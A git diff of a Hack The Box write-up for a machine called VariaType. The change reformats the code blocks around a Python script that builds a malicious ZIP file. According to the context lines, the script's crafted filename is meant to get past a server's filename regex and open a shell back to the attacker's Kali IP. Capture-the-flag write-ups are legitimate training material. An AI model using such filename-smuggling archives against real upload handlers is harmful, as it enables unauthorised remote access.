@@ -1796,9 +1796,11 @@ This script demonstrates that the server environment is configured to run Python
 To bypass the script's strict filename regex (`SAFE_NAME_REGEX`), create a malicious ZIP file locally.
 
 ```shell
-                                                                                                                                  
 ┌──(kali㉿kali)-[~/PUEMAN/HTB/SN10/VariaType]
-└─$ cat exploit.py              
+└─$ cat exploit.py     
+```
+
+```python
 import zipfile
 
 # Your Kali IP and a new port for the Steve shell
@@ -1819,6 +1821,8 @@ with zipfile.ZipFile('exploit.zip', 'w') as zipf:
 
 print(f"Created exploit.zip with filename: {exploit_filename}")
 ```
+
+Logic:
 <div align="center">
 <br>
 <br>
